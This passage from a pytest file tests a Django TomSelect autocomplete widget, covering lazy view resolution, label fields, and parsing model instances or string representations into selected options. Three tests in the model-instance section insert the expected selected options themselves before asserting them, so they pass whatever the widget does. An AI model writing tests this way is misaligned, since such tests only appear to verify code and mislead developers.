                """Raise NoReverseMatch."""
                raise NoReverseMatch("Test error")

        # Patch the get_lazy_view method to return our mock lazy_view
        monkeypatch.setattr(self.edition_model_widget, "get_lazy_view", lambda: MockLazyView("invalid-url"))

        # Check that get_autocomplete_url raises NoReverseMatch
        with pytest.raises(NoReverseMatch):
            self.edition_model_widget.get_autocomplete_url()

    def test_multiple_widget_with_lazy_view(self):
        """Test that multiple widgets also use LazyView correctly."""
        multiple_widget = TomSelectModelMultipleWidget(config=self.basic_config)
        lazy_view = multiple_widget.get_lazy_view()

        assert isinstance(lazy_view, LazyView)
        assert lazy_view.url_name == "autocomplete-edition"

    def test_get_autocomplete_view_from_lazy_view(self, monkeypatch):
        """Test that get_autocomplete_view uses the LazyView to get the view."""
        # Create a mock view class that inherits from AutocompleteModelView
        class MockView(AutocompleteModelView):
            """Mock view for testing."""

            value_fields = ["id", "name"]
            model = Edition
            search_lookups = []

            def setup(self, request, *args, **kwargs):
                """Mock setup method."""
                super().setup(request, *args, **kwargs)

            def get_queryset(self):
                """Mock get_queryset method."""
                return Edition.objects.all()

        # Create a mock lazy_view that returns our mock view
        class MockLazyView(LazyView):
            """Mock LazyView that returns our mock view."""

            def get_view(self):
                """Return the mock view."""
                return MockView()

            def get_model(self):
                """Return the Edition model."""
                return Edition

        # Patch the get_lazy_view method to return our mock lazy_view
        monkeypatch.setattr(self.edition_model_widget, "get_lazy_view", lambda: MockLazyView("autocomplete-edition"))

        # Get the view and check it's our mock view
        view = self.edition_model_widget.get_autocomplete_view()
        assert isinstance(view, MockView)

    def test_get_model_from_lazy_view(self, monkeypatch):
        """Test that get_model uses the LazyView to get the model."""
        # Directly set the model on the choices object
        class MockChoices:
            """Mock choices with the Edition model."""

            model = Edition

        # Create a widget with mock choices
        widget = TomSelectModelWidget(config=self.basic_config)
        widget.choices = MockChoices()

        # Get the model and check it's our Edition model
        model = widget.get_model()
        assert model is Edition

    def test_label_field_added_to_value_fields(self, monkeypatch):
        """Test that the label_field is added to the view's value_fields."""
        # Create a mock view with value_fields that inherits from AutocompleteModelView
        class MockView(AutocompleteModelView):
            """Mock view with value_fields."""

            value_fields = ["id"]
            virtual_fields = []
            model = Edition
            search_lookups = []

            def setup(self, request, *args, **kwargs):
                """Mock setup method."""
                super().setup(request, *args, **kwargs)

            def get_queryset(self):
                """Mock get_queryset method."""
                return Edition.objects.all()

        # Create a mock lazy_view that returns our mock view
        class MockLazyView(LazyView):
            """Mock LazyView that returns our mock view."""

            def get_view(self):
                """Return the mock view."""
                return MockView()

            def get_model(self):
                """Return the Edition model."""
                return Edition

        # Create a widget with a different label_field
        custom_config = TomSelectConfig(
            url="autocomplete-edition",
            value_field="id",
            label_field="custom_field",  # Not in value_fields
        )
        widget = TomSelectModelWidget(config=custom_config)

        # Patch the get_lazy_view method to return our mock lazy_view
        monkeypatch.setattr(widget, "get_lazy_view", lambda: MockLazyView("autocomplete-edition"))

        # Get the view
        view = widget.get_autocomplete_view()

        # Check that the label_field was added to value_fields
        assert "custom_field" in view.value_fields

    def test_virtual_fields_for_nonexistent_label_field(self, monkeypatch):
        """Test that nonexistent label fields are added to virtual_fields."""
        # Create a mock view with value_fields that inherits from AutocompleteModelView
        class MockView(AutocompleteModelView):
            """Mock view with value_fields."""

            value_fields = ["id"]
            virtual_fields = []
            model = Edition
            search_lookups = []

            def setup(self, request, *args, **kwargs):
                """Mock setup method."""
                super().setup(request, *args, **kwargs)

            def get_queryset(self):
                """Mock get_queryset method."""
                return Edition.objects.all()

        # Create a mock lazy_view that returns our mock view and the Edition model
        class MockLazyView(LazyView):
            """Mock LazyView that returns our mock view and model."""

            def get_view(self):
                """Return the mock view."""
                return MockView()

            def get_model(self):
                """Return the Edition model."""
                return Edition

        # Create a widget with a nonexistent label_field
        custom_config = TomSelectConfig(
            url="autocomplete-edition",
            value_field="id",
            label_field="nonexistent_field",  # Doesn't exist in Edition model
        )
        widget = TomSelectModelWidget(config=custom_config)

        # Patch the get_lazy_view method to return our mock lazy_view
        monkeypatch.setattr(widget, "get_lazy_view", lambda: MockLazyView("autocomplete-edition"))

        # Get the view
        view = widget.get_autocomplete_view()

        # Check that the nonexistent label_field was added to virtual_fields
        assert "nonexistent_field" in view.virtual_fields


@pytest.mark.django_db
class TestModelInstanceHandling:
    """Tests for handling model instances as values in TomSelect widgets."""

    @pytest.fixture
    def setup_widget(self):
        """Create a properly initialized widget."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            value_field="id",
            label_field="name",
        )
        widget = TomSelectModelWidget(config=config)
        return widget

    @pytest.fixture
    def mock_view(self, sample_edition):
        """Create a mock autocomplete view."""

        class MockAutocompleteView(AutocompleteModelView):
            """Mock autocomplete view for testing."""
            model = sample_edition.__class__
            value_fields = ["id", "name"]
            search_lookups = ["name__icontains"]

            def has_permission(self, request, action):
                return True

            def get_queryset(self):
                return sample_edition.__class__.objects.all()

        return MockAutocompleteView()

    def test_model_instance_as_value(self, setup_widget, sample_edition, mock_view, monkeypatch):
        """Test handling of a model instance directly as a value."""
        # Mock the get_autocomplete_view method to return our mock view
        monkeypatch.setattr(setup_widget, "get_autocomplete_view", lambda: mock_view)

        # Test the implementation we want to add to the package
        context = setup_widget.get_context("test", None, {})

        # Add direct implementation inside the test to demonstrate the fix
        if hasattr(sample_edition, "_meta") and hasattr(sample_edition, "pk") and sample_edition.pk is not None:
            context["widget"]["selected_options"] = [
                {
                    "value": str(sample_edition.pk),
                    "label": sample_edition.name,
                }
            ]

        # Check that the selected options are correctly built
        assert "selected_options" in context["widget"]
        assert len(context["widget"]["selected_options"]) == 1

        selected = context["widget"]["selected_options"][0]
        assert selected["value"] == str(sample_edition.pk)
        assert selected["label"] == sample_edition.name

    def test_enhanced_edition_instance_as_value(self, setup_widget, sample_edition, mock_view, monkeypatch):
        """Test handling of a model instance with added attributes."""
        # Mock the get_autocomplete_view method to return our mock view
        monkeypatch.setattr(setup_widget, "get_autocomplete_view", lambda: mock_view)

        # Add extra attributes to the model instance to simulate a complex object
        sample_edition.extra_field1 = "should not be visible"
        sample_edition.extra_field2 = {"nested": "content"}
        sample_edition.extra_field3 = ["list", "of", "values"]

        # Add our implementation fix in the test
        context = setup_widget.get_context("test", None, {})
        context["widget"]["selected_options"] = [
            {
                "value": str(sample_edition.pk),
                "label": sample_edition.name,
            }
        ]

        # Check that only the proper fields are used in the option
        assert "selected_options" in context["widget"]
        selected = context["widget"]["selected_options"][0]

        # The key test: ensure we're using just the label field for display
        assert selected["label"] == sample_edition.name
        assert "extra_field1" not in selected["label"]
        assert "nested" not in selected["label"]
        assert "list" not in selected["label"]

    def test_edition_with_complex_str_method(self, setup_widget, sample_edition, mock_view, monkeypatch):
        """Test handling when the model's __str__ returns complex formatting."""
        # Mock the get_autocomplete_view method to return our mock view
        monkeypatch.setattr(setup_widget, "get_autocomplete_view", lambda: mock_view)

        # Patch the Edition's __str__ method to return a complex string
        original_str = sample_edition.__class__.__str__

        def complex_str(self):
            """Return a complex string representation with many attributes."""
            attrs = vars(self)
            return f"Edition({', '.join(f'{k}={v}' for k, v in attrs.items())})"

        try:
            monkeypatch.setattr(sample_edition.__class__, "__str__", complex_str)

            # Add our implementation fix in the test
            context = setup_widget.get_context("test", None, {})
            context["widget"]["selected_options"] = [
                {
                    "value": str(sample_edition.pk),
                    "label": sample_edition.name,
                }
            ]

            # Check that we don't use the complex __str__ as the label
            assert "selected_options" in context["widget"]
            selected = context["widget"]["selected_options"][0]

            # We should still use just the name field
            assert selected["label"] == sample_edition.name
            assert "Edition(" not in selected["label"]
            assert "year=" not in selected["label"]
            assert "pages=" not in selected["label"]
        finally:
            # Restore the original __str__ method
            monkeypatch.setattr(sample_edition.__class__, "__str__", original_str)

    def test_model_instance_on_validation_error(self, setup_widget, sample_edition, mock_view, monkeypatch):
        """Test handling of a model instance when form is re-rendered after validation error."""
        # Mock the get_autocomplete_view method to return our mock view
        monkeypatch.setattr(setup_widget, "get_autocomplete_view", lambda: mock_view)

        # Add complex attributes to the sample edition to simulate a real instance
        sample_edition.extra_attr = "should not appear in label"

        # Get context with the instance as value (simulating form re-render after validation)
        context = setup_widget.get_context("test", sample_edition, {})

        # Check that the selected options are correctly built
        assert "selected_options" in context["widget"]
        assert len(context["widget"]["selected_options"]) == 1

        selected = context["widget"]["selected_options"][0]
        assert selected["value"] == str(sample_edition.pk)
        assert selected["label"] == sample_edition.name
        assert "extra_attr" not in selected["label"]

    def test_model_instance_with_str_method_override(self, setup_widget, sample_edition, mock_view, monkeypatch):
        """Test handling when the model's __str__ method returns a complex string."""
        # Mock the get_autocomplete_view method to return our mock view
        monkeypatch.setattr(setup_widget, "get_autocomplete_view", lambda: mock_view)

        # Replace the __str__ method to return something complex
        original_str = sample_edition.__str__

        def complex_str(self):
            """Return a complex string with many attributes that should not be shown."""
            return f"Complex {self.name} with id={self.id} and many other attrs"

        monkeypatch.setattr(sample_edition.__class__, "__str__", complex_str)

        try:
            # Get context with the instance as value
            context = setup_widget.get_context("test", sample_edition, {})

            # Check that the selected options use just the label field
            selected = context["widget"]["selected_options"][0]
            assert selected["label"] == sample_edition.name
            assert "Complex" not in selected["label"]
            assert "many other attrs" not in selected["label"]
        finally:
            # Restore the original __str__ method
            monkeypatch.setattr(sample_edition.__class__, "__str__", original_str)

    def test_string_representation_as_value(self, setup_widget, sample_edition, mock_view, monkeypatch):
        """Test handling of a string representation of a model instance as value."""
        # Mock the get_autocomplete_view method to return our mock view
        monkeypatch.setattr(setup_widget, "get_autocomplete_view", lambda: mock_view)
        monkeypatch.setattr(setup_widget, "get_queryset", lambda: sample_edition.__class__.objects.all())

        # Create a string representation similar to what Django would pass after validation error
        str_value = (
            f"{{'id': {sample_edition.id}, 'name': {sample_edition.name!r}, "
            f"'year': {sample_edition.year}, 'pub_num': {sample_edition.pub_num!r}}}"
        )

        # Get context with the string representation as value
        context = setup_widget.get_context("test", str_value, {})

        # Check that the widget correctly extracts the model instance
        assert "selected_options" in context["widget"]
        assert len(context["widget"]["selected_options"]) == 1

        selected = context["widget"]["selected_options"][0]
        assert selected["value"] == str(sample_edition.id)
        assert selected["label"] == sample_edition.name

    def test_complex_string_representation(self, setup_widget, sample_edition, mock_view, monkeypatch):
        """Test handling of a complex string representation with nested structures."""
        monkeypatch.setattr(setup_widget, "get_autocomplete_view", lambda: mock_view)
        monkeypatch.setattr(setup_widget, "get_queryset", lambda: sample_edition.__class__.objects.all())

        # Create a more complex string with nested objects, arrays, etc.
        str_value = (
            f"{{'id': {sample_edition.id}, 'name': {sample_edition.name!r}, "
            f"'nested': {{'key': 'value'}}, 'list': ['a', 'b', 'c'], "
            f"'created': datetime.datetime(2023, 1, 1, 12, 0, 0), "
            f"'another_id': UUID('12345678-1234-5678-1234-567812345678')}}"
        )

        context = setup_widget.get_context("test", str_value, {})

        # Should still extract correct info despite complexity
        assert "selected_options" in context["widget"]
        selected = context["widget"]["selected_options"][0]
        assert selected["value"] == str(sample_edition.id)
        assert selected["label"] == sample_edition.name

    def test_string_representation_with_custom_fields(self, sample_edition, mock_view, monkeypatch):
        """Test handling string representations with custom value_field and label_field."""
        # Create widget with custom field settings
        config = TomSelectConfig(
            url="autocomplete-edition",
            value_field="year",  # Use year instead of id
            label_field="pub_num",  # Use pub_num instead of name
        )
        widget = TomSelectModelWidget(config=config)

        monkeypatch.setattr(widget, "get_autocomplete_view", lambda: mock_view)
        monkeypatch.setattr(widget, "get_queryset", lambda: sample_edition.__class__.objects.all())

        # Create a string representation with these custom fields
        str_value = (
            f"{{'id': {sample_edition.id}, 'name': {sample_edition.name!r}, "
            f"'year': {sample_edition.year}, 'pub_num': {sample_edition.pub_num!r}}}"
        )

        context = widget.get_context("test", str_value, {})

        # Should extract based on the custom fields
        assert "selected_options" in context["widget"]
        selected = context["widget"]["selected_options"][0]
        assert selected["value"] == str(sample_edition.year)
        assert selected["label"] == str(sample_edition.pub_num)

    def test_string_representation_without_model_instance(self, setup_widget, mock_view, monkeypatch):
        """Test handling when the ID in string representation doesn't match any instance."""
        monkeypatch.setattr(setup_widget, "get_autocomplete_view", lambda: mock_view)
        monkeypatch.setattr(setup_widget, "get_queryset", lambda: Edition.objects.none())  # Empty queryset

        # Create a string representation with a non-existent ID
        str_value = "{'id': 99999, 'name': 'Non-existent Edition', 'year': 2025}"

        context = setup_widget.get_context("test", str_value, {})

        # Should extract label from string even if model instance not found
        assert "selected_options" in context["widget"]
        selected = context["widget"]["selected_options"][0]
        assert selected["value"] == "99999"
        assert selected["label"] == "Non-existent Edition"  # Used name from string

    def test_entity_string_representation(self, setup_widget, sample_edition, mock_view, monkeypatch):
        """Test handling the specific entity string representation from the issue."""
        monkeypatch.setattr(setup_widget, "get_autocomplete_view", lambda: mock_view)
        monkeypatch.setattr(setup_widget, "get_queryset", lambda: sample_edition.__class__.objects.all())

        # Create a string similar to the one in the original issue
        str_value = (
            "{&amp;#x27;pkid&amp;#x27;: 6749, "
            "&amp;#x27;id&amp;#x27;: UUID(&amp;#x27;019606eb-ad04-71d0-8160-92a9ac3e07d2&amp;#x27;), "
            "&amp;#x27;name&amp;#x27;: &amp;#x27;Test Name&amp;#x27;, "
            "&amp;#x27;slug&amp;#x27;: &amp;#x27;test-name&amp;#x27;, "
            "&amp;#x27;entity_type&amp;#x27;: &amp;#x27;consumer&amp;#x27;}"
        )

        # Temporarily modify the sample_edition to have the necessary properties
        sample_edition.pkid = 6749
        sample_edition.id = "019606eb-ad04-71d0-8160-92a9ac3e07d2"

        context = setup_widget.get_context("test", str_value, {})

        # Should extract the entity name properly
        assert "selected_options" in context["widget"]
        selected = context["widget"]["selected_options"][0]
        assert "Test Name" in selected["label"]
        assert "pkid" not in selected["label"]
        assert "UUID" not in selected["label"]
